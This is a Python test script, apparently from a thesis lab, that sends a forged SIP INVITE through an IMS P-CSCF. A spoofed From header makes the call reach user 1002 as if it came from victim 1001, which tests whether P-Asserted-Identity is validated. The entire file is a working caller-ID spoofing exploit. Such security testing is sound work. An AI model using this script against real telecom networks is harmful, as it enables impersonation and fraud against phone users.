#!/usr/bin/env python3
"""V3 - Suplantacion de identidad (User Impersonation).
Tesis 3.3: INVITE con From forjado via P-CSCF. Si no se valida
P-Asserted-Identity contra el registro autenticado, la llamada
llega al destino mostrando la identidad de la victima.

Uso (desde kali .99): VICTIM=1001 TARGET=1002 PCSCF=172.20.0.6 PORT=4060 \
  DOMAIN=ims.mnc070.mcc999.3gppnetwork.org python3 v3_spoof.py
Veredicto: llamada entrante en 1002 mostrando 1001 => VULNERABLE.
"""
import socket
import time
import os

SCSCF = os.environ.get("PCSCF", "172.20.0.6")
SCSCF_PORT = int(os.environ.get("PORT", "4060"))
DOMAIN = os.environ.get("DOMAIN", "ims.mnc070.mcc999.3gppnetwork.org")
VICTIM = os.environ.get("VICTIM", "1001")  # identidad suplantada (From)
TARGET = os.environ.get("TARGET", "1002")  # destino (To, registrado)
SRC_IP = os.environ.get("SRC_IP", "172.20.0.99")
CALLID = "forged-v3-%d@%s" % (int(time.time()), SRC_IP)
BRANCH = "z9hG4bKv3%x" % int(time.time())


def build_invite():
    sdp = (
        "v=0\r\n"
        "o=- 0 0 IN IP4 %s\r\n"
        "s=-\r\n"
        "c=IN IP4 %s\r\n"
        "t=0 0\r\n"
        "m=audio 20000 RTP/AVP 0\r\n"
        "a=rtpmap:0 PCMU/8000\r\n"
    ) % (SRC_IP, SRC_IP)
    req = (
        "INVITE sip:%s@%s SIP/2.0\r\n"
        "Via: SIP/2.0/UDP %s:5060;branch=%s\r\n"
        "Max-Forwards: 70\r\n"
        "From: <sip:%s@%s>;tag=forged001\r\n"
        "To: <sip:%s@%s>\r\n"
        "Call-ID: %s\r\n"
        "CSeq: 1 INVITE\r\n"
        "Contact: <sip:attacker@%s:5060>\r\n"
        "Content-Type: application/sdp\r\n"
        "Content-Length: %d\r\n"
        "\r\n"
        "%s"
    ) % (TARGET, DOMAIN, SRC_IP, BRANCH, VICTIM, DOMAIN, TARGET, DOMAIN,
         CALLID, SRC_IP, len(sdp), sdp)
    return req.encode()


def main():
    payload = build_invite()
    print("Sending forged INVITE From:%s To:%s via P-CSCF %s:%d Call-ID:%s"
          % (VICTIM, TARGET, SCSCF, SCSCF_PORT, CALLID))
    # UDP al P-CSCF (path legítimo P->I->S; directo al S-CSCF falla 478/DNS)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(payload, (SCSCF, SCSCF_PORT))
    # reintentos (INVITE retransmit)
    for _ in range(2):
        time.sleep(1.0)
        s.sendto(payload, (SCSCF, SCSCF_PORT))
    print("sent Call-ID=%s. Revisar: baresip 1002 (llamada entrante de %s?) + S-CSCF log." % (CALLID, VICTIM))


if __name__ == "__main__":
    main()
